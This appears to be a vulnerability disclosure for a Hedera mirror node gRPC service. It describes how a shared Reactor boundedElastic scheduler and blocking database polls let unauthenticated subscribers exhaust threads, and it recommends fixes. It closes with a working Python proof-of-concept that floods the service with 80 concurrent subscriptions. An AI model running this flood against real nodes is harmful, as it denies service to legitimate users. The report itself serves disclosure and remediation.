### Title
Shared `Schedulers.boundedElastic()` Thread Pool Exhaustion via Unbounded Concurrent Subscriptions in `PollingTopicMessageRetriever.retrieve()`

### Summary
`PollingTopicMessageRetriever` stores `Schedulers.boundedElastic()` in a field at construction time, but `Schedulers.boundedElastic()` always returns the **global, process-wide shared** `BoundedElasticScheduler` instance. Every component in the gRPC service (`PollingTopicListener`, `SharedPollingTopicListener`, `SharedTopicListener`, `TopicMessageServiceImpl`) calls the same API and therefore competes for the same bounded thread pool. Because there is no global limit on concurrent subscriptions — only a per-connection cap of 5 — an unprivileged attacker can open enough connections to saturate all scheduler threads with blocking database calls, causing timeout tasks (which also use the same scheduler) to queue indefinitely, preventing subscription cleanup and producing a self-reinforcing degradation spiral that denies service to all legitimate subscribers.

### Finding Description

**Code path:**

`PollingTopicMessageRetriever` constructor, line 41:
```java
scheduler = Schedulers.boundedElastic();
```
`retrieve()`, lines 51–59:
```java
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(...)
        .withFixedDelay(context.getFrequency())
        .withScheduler(scheduler))          // line 55 – delay scheduling
    ...
    .timeout(retrieverProperties.getTimeout(), scheduler)  // line 59 – timeout scheduling
```
`poll()`, line 78:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**Root cause — failed assumption:**
The code assumes `Schedulers.boundedElastic()` returns a private scheduler. It does not. Reactor's `Schedulers.boundedElastic()` is a static factory that always returns the same global singleton (`Schedulers.DEFAULT_BOUNDED_ELASTIC_SCHEDULER`). The field assignment on line 41 stores a reference to the shared global pool, not an isolated one. Every other component that calls `Schedulers.boundedElastic()` — `PollingTopicListener` (line 31), `SharedPollingTopicListener` (line 37), `SharedTopicListener` (line 25), `TopicMessageServiceImpl` (line 70) — shares the same pool.

**Blocking execution on scheduler threads:**
`RepeatSpec.withScheduler(scheduler)` schedules the re-subscription after each delay on a `boundedElastic` thread. The re-subscription calls `poll()`, which executes `Flux.fromStream(topicMessageRepository.findByFilter(...))` — a synchronous, blocking JDBC `Stream` iteration — on that same thread. The thread is held for the full duration of the database query before being returned to the pool.

**Timeout feedback loop:**
`.timeout(retrieverProperties.getTimeout(), scheduler)` (default 60 s) schedules its watchdog task on the same pool. When all threads are busy with blocking DB calls, timeout tasks queue behind them. Subscriptions that should expire at 60 s persist until a thread becomes free to run the timeout task. This delays cleanup, allowing the attacker's subscriptions to accumulate further.

**Existing check — insufficient:**
`maxConcurrentCallsPerConnection = 5` (configured in `NettyProperties`, enforced in `GrpcConfiguration` line 33) limits calls *per TCP connection* but places no cap on the total number of connections or the aggregate number of concurrent subscriptions across all connections. There is no global subscriber limit; `subscriberCount` in `TopicMessageServiceImpl` is a metric gauge only, not an enforcement gate.

### Impact Explanation

`Schedulers.boundedElastic()` defaults to `10 × availableProcessors` threads (e.g., 80 threads on an 8-core node). Once all threads are occupied with blocking DB queries from attacker subscriptions, legitimate subscribers' poll tasks queue behind them. Because timeout tasks share the same queue, stuck subscriptions are not cleaned up on schedule. New `subscribeTopic` calls that reach `retrieve()` also queue their first poll task and appear to hang. The gRPC service continues to accept connections but delivers no messages, effectively stopping transaction confirmation visibility for all clients. The `retryWhen(Retry.backoff(Long.MAX_VALUE, ...))` on line 58 means each subscription retries indefinitely, compounding queue pressure after any transient DB error.

### Likelihood Explanation

No authentication or authorization is required to call `subscribeTopic`. An attacker needs only a network path to port 5600. To saturate 80 `boundedElastic` threads on an 8-core node, the attacker opens ⌈80 / 5⌉ = 16 TCP connections, each carrying 5 concurrent `subscribeTopic` streaming calls with `startTime = 0` (maximizing DB query duration by scanning all historical messages). This is achievable with a single script using any gRPC client library. The attack is repeatable and requires no special knowledge beyond the public proto definition.

### Recommendation

1. **Isolate the scheduler**: Replace `Schedulers.boundedElastic()` with a dedicated, explicitly sized scheduler:
   ```java
   scheduler = Schedulers.newBoundedElastic(
       retrieverProperties.getSchedulerThreadCap(),
       Integer.MAX_VALUE,
       "polling-retriever");
   ```
   This prevents cross-component interference.

2. **Enforce a global subscription limit**: Add an `AtomicInteger` gate in `TopicMessageServiceImpl.subscribeTopic()` that rejects new subscriptions (with `RESOURCE_EXHAUSTED` gRPC status) when the count exceeds a configurable maximum.

3. **Add a per-IP or per-client connection limit** at the Netty layer (`NettyServerBuilder.maxConnectionsPerIp` or an equivalent interceptor) to bound the number of connections a single source can open.

4. **Replace blocking `Flux.fromStream`** with a non-blocking reactive query so scheduler threads are not held during DB I/O.

### Proof of Concept

```python
# Requires: grpcio, protobuf, hedera-mirror proto stubs
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cs_pb
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 16   # 16 connections × 5 calls = 80 concurrent subscriptions
CALLS_PER_CONN = 5

def flood(channel):
    stub = cs.ConsensusServiceStub(channel)
    req = cs_pb.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0)
        # no limit, no end time → infinite throttled subscription
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

channels = [grpc.insecure_channel(TARGET) for _ in range(CONNECTIONS)]
workers = [threading.Thread(target=flood, args=(c,)) for c in channels]
for w in workers: w.start()
# After ~10s, open a legitimate subscription and observe it receives no messages
# and the timeout (60s) does not fire on schedule.
```
